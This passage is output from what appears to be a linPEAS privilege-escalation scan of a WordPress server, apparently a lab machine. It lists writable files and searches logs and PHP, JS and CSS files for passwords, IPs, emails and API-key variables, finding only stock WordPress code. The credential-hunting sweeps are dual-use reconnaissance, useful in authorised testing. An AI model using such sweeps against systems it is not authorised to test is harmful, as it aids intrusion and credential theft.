/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/media-text
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/media-text/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/media-text/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/navigation
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/navigation/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/navigation/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph/_style.scss

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group www-data:


[+] Searching passwords in config PHP files

[+] Checking for TTY (sudo/su) passwords in audit logs

[+] Finding IPs inside logs (limit 70)
     68 /var/log/dpkg.log:3.18.04.3
     38 /var/log/dpkg.log:2.18.04.2
     26 /var/log/dpkg.log:18.04.11.4
     24 /var/log/dpkg.log:1.18.04.14
     23 /var/log/dpkg.log:7.18.04.2
     23 /var/log/dpkg.log:3.192.1.3
     23 /var/log/cloud-init-output.log:10.10.10.2
     22 /var/log/dpkg.log:3.192.1.7
     21 /var/log/wtmp:10.10.14.3
     18 /var/log/cloud-init-output.log:10.10.10.44
     17 /var/log/dpkg.log:3.192.1.9
     17 /var/log/dpkg.log:1.18.04.5
     14 /var/log/dpkg.log:3.18.04.1
     14 /var/log/dpkg.log:18.04.11.13
     11 /var/log/dpkg.log:2.18.04.3
      8 /var/log/dpkg.log:5.18.04.4
      8 /var/log/apt/history.log:3.18.04.3
      7 /var/log/dpkg.log:6.18.04.1
      7 /var/log/dpkg.log:1.18.04.2
      7 /var/log/dpkg.log:1.18.04.1
      5 /var/log/cloud-init-output.log:10.10.10.223
      4 /var/log/apt/history.log:2.18.04.2
      4 /var/log/apt/history.log:18.04.11.4
      3 /var/log/apt/history.log:7.18.04.2
      2 /var/log/wtmp:10.10.14.5
      2 /var/log/lastlog:10.10.14.3
      2 /var/log/apt/history.log:3.192.1.7
      2 /var/log/apt/history.log:3.192.1.3
      2 /var/log/apt/history.log:3.18.04.1
      2 /var/log/apt/history.log:18.04.11.13
      2 /var/log/apt/history.log:1.18.04.5
      2 /var/log/apt/history.log:1.18.04.14
      1 /var/log/installer/subiquity-debug.log:127.255.255.255
      1 /var/log/cloud-init-output.log:10.129.71.67
      1 /var/log/apt/history.log:6.18.04.1
      1 /var/log/apt/history.log:5.18.04.4
      1 /var/log/apt/history.log:3.192.1.9
      1 /var/log/apt/history.log:2.18.04.3
      1 /var/log/apt/history.log:1.18.04.2
      1 /var/log/apt/history.log:1.18.04.1

[+] Finding passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/cloud-init.log:2020-12-08 09:19:51,306 - cc_set_passwords.py[DEBUG]: Leaving ssh config 'PasswordAuthentication' unchanged. ssh_pwauth=None
/var/log/cloud-init.log:2020-12-08 10:04:43,765 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 10:19:59,120 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 10:29:04,033 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 10:42:00,728 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 11:59:39,444 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-08 13:48:38,690 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-09 11:51:03,246 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-10 09:24:59,191 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-10 10:24:29,533 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-10 10:36:02,477 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-10 10:41:14,157 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-10 14:42:31,987 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-16 11:14:18,965 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-16 12:54:18,510 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-16 15:11:26,859 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-17 09:33:23,247 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-12-17 09:58:50,354 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-01-07 09:53:27,604 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-01-07 10:11:53,970 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-01-07 10:14:19,684 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-01-07 10:23:08,987 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-01-13 08:03:39,443 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-02-11 14:37:27,144 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2021-02-17 13:39:21,407 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dpkg.log:2018-07-25 22:58:48 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:48 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:48 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:48 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:48 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:48 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:51 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:51 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:51 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:51 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:56 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2018-07-25 22:58:56 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2018-07-25 22:58:56 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2018-07-25 22:58:57 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2018-07-25 22:58:57 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:57 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:58:57 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2018-07-25 22:59:00 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2018-07-25 22:59:00 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2018-07-25 22:59:00 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2018-07-25 22:59:00 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-12-08 09:33:49 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log:2020-12-08 09:33:49 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-12-08 09:33:49 status half-configured passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-12-08 09:33:49 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-12-08 09:33:49 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-12-08 09:33:49 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-12-08 09:33:49 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-12-08 09:33:49 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
/var/log/installer/installer-journal.txt:Dec 08 09:12:08 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.

[+] Finding emails inside logs (limit 70)
      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
/var/www/html/wordpress/wp-admin/authorize-application.php:										'password'   => '[------]',
/var/www/html/wordpress/wp-admin/authorize-application.php:							esc_html__( 'Your new password for %s is:' ),
/var/www/html/wordpress/wp-admin/authorize-application.php:						'password'   => urlencode( $new_password ),
/var/www/html/wordpress/wp-admin/authorize-application.php:			list( $new_password ) = $created;
/var/www/html/wordpress/wp-admin/authorize-application.php:		$created = WP_Application_Passwords::create_new_application_password(
/var/www/html/wordpress/wp-admin/authorize-application.php:		<?php if ( $new_password ) : ?>
/var/www/html/wordpress/wp-admin/authorize-application.php:$new_password = '';
/var/www/html/wordpress/wp-admin/authorize-application.php:if ( isset( $_POST['action'] ) && 'authorize_application_password' === $_POST['action'] ) {
/var/www/html/wordpress/wp-admin/includes/class-ftp.php:		$this->_password="anon@ftp.com";
/var/www/html/wordpress/wp-admin/includes/class-ftp.php:		else $this->_password="anon@anon.com";
/var/www/html/wordpress/wp-admin/includes/class-ftp.php:		if(!is_null($pass)) $this->_password=$pass;
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:			$this->options['password'] = $opt['password'];
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:		$pwd = ftp_pwd( $this->link );
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php:			$this->options['password'] = $opt['password'];
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php:			$this->options['password'] = $opt['password'];
/var/www/html/wordpress/wp-admin/includes/class-wp-importer.php:	public function get_page( $url, $username = '', $password = '', $head = false ) {
/var/www/html/wordpress/wp-admin/includes/export.php:		<wp:post_password><?php echo wxr_cdata( $post->post_password ); ?></wp:post_password>
/var/www/html/wordpress/wp-admin/includes/file.php:		$password_value = '*****';
/var/www/html/wordpress/wp-admin/includes/file.php:	$password_value = '';
/var/www/html/wordpress/wp-admin/includes/list-table.php:		'WP_Application_Passwords_List_Table'         => 'application-passwords',
/var/www/html/wordpress/wp-admin/includes/meta-boxes.php:					$post->post_password = '';
/var/www/html/wordpress/wp-admin/includes/post.php:				$_POST['post_password'] = '';
/var/www/html/wordpress/wp-admin/includes/post.php:				$post_data['post_password'] = '';
/var/www/html/wordpress/wp-admin/includes/post.php:		$post->post_password  = '';
/var/www/html/wordpress/wp-admin/includes/privacy-tools.php:				'post_password' => '',
/var/www/html/wordpress/wp-admin/includes/schema.php:Password: PASSWORD
/var/www/html/wordpress/wp-admin/includes/upgrade.php:				WP_Application_Passwords::USERMETA_KEY_APPLICATION_PASSWORDS
/var/www/html/wordpress/wp-admin/includes/upgrade.php:			$email_password = true;
/var/www/html/wordpress/wp-admin/includes/upgrade.php:			$user_password = wp_generate_password( 12, false );
/var/www/html/wordpress/wp-admin/includes/upgrade.php:			'password'         => $user_password,
/var/www/html/wordpress/wp-admin/includes/upgrade.php:			'password_message' => $message,
/var/www/html/wordpress/wp-admin/includes/upgrade.php:			update_network_option( $network_id, WP_Application_Passwords::OPTION_KEY_IN_USE, 1 );
/var/www/html/wordpress/wp-admin/includes/upgrade.php:		$email_password = false;
/var/www/html/wordpress/wp-admin/includes/upgrade.php:		$user_password  = trim( $user_password );
/var/www/html/wordpress/wp-admin/includes/upgrade.php:Password: %3$s
/var/www/html/wordpress/wp-admin/includes/user.php:		|| isset( $_GET['default_password_nag'] ) && '0' == $_GET['default_password_nag']
/var/www/html/wordpress/wp-admin/includes/user.php:function default_password_nag_handler( $errors = false ) {
/var/www/html/wordpress/wp-admin/install.php:				<input name="admin_password2" type="password" id="pass2" autocomplete="off" />
/var/www/html/wordpress/wp-admin/install.php:		} elseif ( $admin_password !== $admin_password_check ) {
/var/www/html/wordpress/wp-admin/network/site-new.php:		$password = wp_generate_password( 12, false );
/var/www/html/wordpress/wp-admin/network/site-new.php:		wpmu_welcome_notification( $id, $user_id, $password, $title, array( 'public' => 1 ) );
/var/www/html/wordpress/wp-admin/network/site-new.php:	$password = 'N/A';
/var/www/html/wordpress/wp-admin/network/site-users.php:				$password = wp_generate_password( 12, false );
/var/www/html/wordpress/wp-admin/network/user-new.php:		$password = wp_generate_password( 12, false );
/var/www/html/wordpress/wp-admin/setup-config.php:		$pwd    = trim( wp_unslash( $_POST['pwd'] ) );
/var/www/html/wordpress/wp-admin/user-edit.php:						__( 'Your new password for %s is:' ),
/var/www/html/wordpress/wp-admin/user-edit.php:		$show_password_fields = apply_filters( 'show_password_fields', true, $profileuser );
/var/www/html/wordpress/wp-admin/user-edit.php:		<?php if ( wp_is_application_passwords_available_for_user( $user_id ) ) : ?>
/var/www/html/wordpress/wp-admin/user-edit.php:	<div class="application-passwords hide-if-no-js" id="application-passwords-section">
/var/www/html/wordpress/wp-admin/user-edit.php:<?php if ( isset( $application_passwords_list_table ) ) : ?>
/var/www/html/wordpress/wp-admin/user-edit.php:<tr id="password" class="user-pass1-wrap">
/var/www/html/wordpress/wp-admin/user-new.php:				<?php $initial_password = wp_generate_password( 24 ); ?>
/var/www/html/wordpress/wp-admin/user-new.php:		<input name="pass2" type="password" id="pass2" autocomplete="off" aria-describedby="pass2-desc" />
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/color-patterns.php:		input[type="password"]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/inc/template-functions.php:function twenty_twenty_one_password_form( $post = 0 ) {
/var/www/html/wordpress/wp-includes/PHPMailer/PHPMailer.php:    public $Password = '';
/var/www/html/wordpress/wp-includes/SimplePie/Cache/MySQL.php: * For example, `mysql://root:password@localhost:3306/mydb?prefix=sp_` will
/var/www/html/wordpress/wp-includes/class-simplepie.php:define('SIMPLEPIE_TYPE_RSS_091_USERLAND', 4);
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:				$passwords[ $i ]['uuid'] = wp_generate_uuid4();
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:			$password['last_ip']   = $_SERVER['REMOTE_ADDR'];
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:			$password['last_used'] = time();
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:			'password'  => $hashed_password,
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:			if ( $password['uuid'] !== $uuid ) {
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:			if ( $password['uuid'] === $uuid ) {
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$hashed_password = wp_hash_password( $new_password );
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$new_password    = wp_generate_password( static::PW_LENGTH, false );
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$passwords   = static::get_user_application_passwords( $user_id );
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$passwords = static::get_user_application_passwords( $user_id );
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$passwords[] = $new_item;
/var/www/html/wordpress/wp-includes/class-wp-application-passwords.php:		$raw_password = preg_replace( '/[^a-z\d]/i', '', $raw_password );

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files
/var/www/html/wordpress/wp-admin/css/colors/_admin.scss:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/blue/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/blue/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/light/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/light/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/modern/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/modern/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:	.wp-pwd [type="password"] {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:	.wp-pwd [type="text"],
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:	.wp-pwd button.button:active {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:	.wp-pwd button.button:focus {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:	.wp-pwd button.button:hover,
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:.form-table .form-required.user-pass1-wrap.form-invalid .password-input-wrapper:after {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:.wp-pwd [type="password"] {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:.wp-pwd [type="text"],
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:.wp-pwd input::-ms-reveal {
/var/www/html/wordpress/wp-admin/css/forms-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/css/forms.css:	.wp-pwd [type="password"] {
/var/www/html/wordpress/wp-admin/css/forms.css:	.wp-pwd [type="text"],
/var/www/html/wordpress/wp-admin/css/forms.css:	.wp-pwd button.button:active {
/var/www/html/wordpress/wp-admin/css/forms.css:	.wp-pwd button.button:focus {
/var/www/html/wordpress/wp-admin/css/forms.css:	.wp-pwd button.button:hover,
/var/www/html/wordpress/wp-admin/css/forms.css:.form-table .form-required.user-pass1-wrap.form-invalid .password-input-wrapper:after {
/var/www/html/wordpress/wp-admin/css/forms.css:.wp-pwd [type="password"] {
/var/www/html/wordpress/wp-admin/css/forms.css:.wp-pwd [type="text"],
/var/www/html/wordpress/wp-admin/css/forms.css:.wp-pwd input::-ms-reveal {
/var/www/html/wordpress/wp-admin/css/forms.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-admin/js/application-passwords.js:				password: response.password
/var/www/html/wordpress/wp-admin/js/application-passwords.js:			path: '/wp/v2/users/' + userId + '/application-passwords/' + uuid + '?_locale=user',
/var/www/html/wordpress/wp-admin/js/application-passwords.js:			path: '/wp/v2/users/' + userId + '/application-passwords?_locale=user',
/var/www/html/wordpress/wp-admin/js/auth-app.js:					'&password=' + encodeURIComponent( response.password );
/var/www/html/wordpress/wp-admin/js/auth-app.js:			path: '/wp/v2/users/me/application-passwords?_locale=user',
/var/www/html/wordpress/wp-admin/js/common.js:	password: '',
/var/www/html/wordpress/wp-admin/js/password-strength-meter.js:			if (password1 != password2 && password2 && password2.length > 0)
/var/www/html/wordpress/wp-admin/js/password-strength-meter.js:	window.passwordStrength = wp.passwordStrength.meter;
/var/www/html/wordpress/wp-admin/js/password-strength-meter.js:	wp.passwordStrength = {
/var/www/html/wordpress/wp-admin/js/updates.js:			password:        wp.updates.filesystemCredentials.ftp.password,
/var/www/html/wordpress/wp-admin/js/updates.js:			password:       '',
/var/www/html/wordpress/wp-admin/js/updates.js:			wp.updates.filesystemCredentials.ftp.password       = $( '#password' ).val();
/var/www/html/wordpress/wp-admin/js/user-profile.js:				'aria-label': show ? __( 'Show password' ) : __( 'Hide password' )
/var/www/html/wordpress/wp-admin/js/user-profile.js:			if ( 'password' === $pass1.attr( 'type' ) ) {
/var/www/html/wordpress/wp-admin/js/user-profile.js:		$passwordWrapper = $pass1Row.find( '.wp-pwd' );
/var/www/html/wordpress/wp-admin/js/user-profile.js:	window.generatePassword = generatePassword;
/var/www/html/wordpress/wp-content/themes/twentynineteen/style-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-content/themes/twentynineteen/style.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwenty/package-lock.json:				"parse-passwd": "^1.0.0"
/var/www/html/wordpress/wp-content/themes/twentytwenty/package-lock.json:			"integrity": "sha1-DTM+PwDqxQqhRUq9MO+MKl2ackI=",
/var/www/html/wordpress/wp-content/themes/twentytwenty/package-lock.json:		"parse-passwd": {
/var/www/html/wordpress/wp-content/themes/twentytwenty/style-rtl.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwenty/style.css:input[type="password"]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/ie.css:.post-password-form input[type=password] {
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/ie.css:input[type=password]:disabled,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/ie.css:input[type=password]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style-rtl.css:.post-password-form input[type=password] {
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style-rtl.css:input[type=password]:disabled,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style-rtl.css:input[type=password]:focus,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style.css:.post-password-form input[type=password] {
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style.css:input[type=password]:disabled,
/var/www/html/wordpress/wp-content/themes/twentytwentyone/style.css:input[type=password]:focus,
/var/www/html/wordpress/wp-includes/css/dist/components/style-rtl.css:  .components-text-control__input[type="password"]:-ms-input-placeholder,

[+] Finding possible password variables inside key folders (limit 140)
/var/www/html/wordpress/wp-admin/authorize-application.php:		<?php if ( $app_name ) : ?>
/var/www/html/wordpress/wp-admin/authorize-application.php:	$app_name    = $_POST['app_name'];
/var/www/html/wordpress/wp-admin/authorize-application.php:$app_name    = ! empty( $_REQUEST['app_name'] ) ? $_REQUEST['app_name'] : '';
/var/www/html/wordpress/wp-admin/includes/class-wp-debug-data.php:		$info['wp-database']['fields']['database_host'] = array(
/var/www/html/wordpress/wp-admin/includes/class-wp-debug-data.php:		$info['wp-database']['fields']['database_name'] = array(
/var/www/html/wordpress/wp-admin/includes/class-wp-debug-data.php:		$info['wp-database']['fields']['database_user'] = array(
/var/www/html/wordpress/wp-admin/includes/misc.php:	$new_admin_email = array(
/var/www/html/wordpress/wp-admin/includes/misc.php:	if ( get_option( 'admin_email' ) === $value || ! is_email( $value ) ) {
/var/www/html/wordpress/wp-admin/includes/network.php:		$admin_email = $_POST['email'];
/var/www/html/wordpress/wp-admin/includes/network.php:		$admin_email = get_option( 'admin_email' );
/var/www/html/wordpress/wp-admin/includes/schema.php:			'admin_email'       => $email,
/var/www/html/wordpress/wp-admin/includes/schema.php:		'admin_email'                     => 'you@example.com',
/var/www/html/wordpress/wp-admin/includes/schema.php:		'admin_email'                 => $email,
/var/www/html/wordpress/wp-admin/includes/schema.php:		'admin_email_lifespan'            => ( time() + 6 * MONTH_IN_SECONDS ),
/var/www/html/wordpress/wp-admin/includes/schema.php:	$email             = ! empty( $meta['admin_email'] ) ? $meta['admin_email'] : '';
/var/www/html/wordpress/wp-admin/install.php:	$admin_email  = isset( $_POST['admin_email'] ) ? trim( wp_unslash( $_POST['admin_email'] ) ) : '';
/var/www/html/wordpress/wp-admin/network/settings.php:					$new_admin_email = get_site_option( 'new_admin_email' );
/var/www/html/wordpress/wp-admin/network/settings.php:					if ( $new_admin_email && get_site_option( 'admin_email' ) !== $new_admin_email ) :
/var/www/html/wordpress/wp-admin/network/settings.php:} elseif ( ! empty( $_GET['dismiss'] ) && 'new_network_admin_email' === $_GET['dismiss'] ) {
/var/www/html/wordpress/wp-admin/options-general.php:$new_admin_email = get_option( 'new_admin_email' );
/var/www/html/wordpress/wp-admin/options-general.php:if ( $new_admin_email && get_option( 'admin_email' ) !== $new_admin_email ) :
/var/www/html/wordpress/wp-admin/options.php:} elseif ( ! empty( $_GET['dismiss'] ) && 'new_admin_email' === $_GET['dismiss'] ) {
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:					$api_key = $first_response_value;
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:					$api_key = $second_response_value;
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:				$api_key = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:			'api_key'          => $api_key,
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:		$api_key      = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-cli.php:		$api_key = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-rest-api.php:		$api_key = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-rest-api.php:		$new_api_key = $request->get_param( 'key' );
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php:		$api_key   = self::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php:		$api_key = self::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php:		if ( 'wordpress_api_key' === $option_name ) {
/var/www/html/wordpress/wp-content/plugins/akismet/wrapper.php:$wpcom_api_key    = defined( 'WPCOM_API_KEY' ) ? constant( 'WPCOM_API_KEY' ) : '';
/var/www/html/wordpress/wp-includes/PHPMailer/SMTP.php:        'SendGrid' => '/[\d]{3} Ok: queued as (.*)/',
/var/www/html/wordpress/wp-includes/js/dist/block-editor.js:/* harmony default export */ var with_client_id = (withClientId);
/var/www/html/wordpress/wp-includes/js/dist/format-library.js:var strikethrough_name = 'core/strikethrough';
/var/www/html/wordpress/wp-includes/js/dist/vendor/react-dom.js:    accesskey: 'accessKey',
/var/www/html/wordpress/wp-includes/js/dist/vendor/react-dom.js:  var ReactPropTypesSecret_1 = ReactPropTypesSecret;
/var/www/html/wordpress/wp-includes/js/dist/vendor/react.js:  var ReactPropTypesSecret_1 = ReactPropTypesSecret;
/var/www/html/wordpress/wp-includes/load.php:	$dbhost     = defined( 'DB_HOST' ) ? DB_HOST : '';
/var/www/html/wordpress/wp-includes/load.php:	$dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
/var/www/html/wordpress/wp-includes/media.php:			$img_url          = str_replace( $img_url_basename, $meta['sizes']['full']['file'], $img_url );
/var/www/html/wordpress/wp-includes/media.php:			$img_url         = str_replace( $img_url_basename, wp_basename( $thumb_file ), $img_url );
/var/www/html/wordpress/wp-includes/media.php:			$img_url_basename = $meta['sizes']['full']['file'];
/var/www/html/wordpress/wp-includes/media.php:		$img_url         = str_replace( $img_url_basename, $intermediate['file'], $img_url );
/var/www/html/wordpress/wp-includes/media.php:	$img_url          = wp_get_attachment_url( $id );
/var/www/html/wordpress/wp-includes/media.php:	$img_url_basename = wp_basename( $img_url );
/var/www/html/wordpress/wp-includes/ms-functions.php:		$admin_email = 'support@' . wp_parse_url( network_home_url(), PHP_URL_HOST );
/var/www/html/wordpress/wp-includes/ms-functions.php:	$admin_email = get_site_option( 'admin_email' );
/var/www/html/wordpress/wp-includes/ms-functions.php:	$new_admin_email = array(
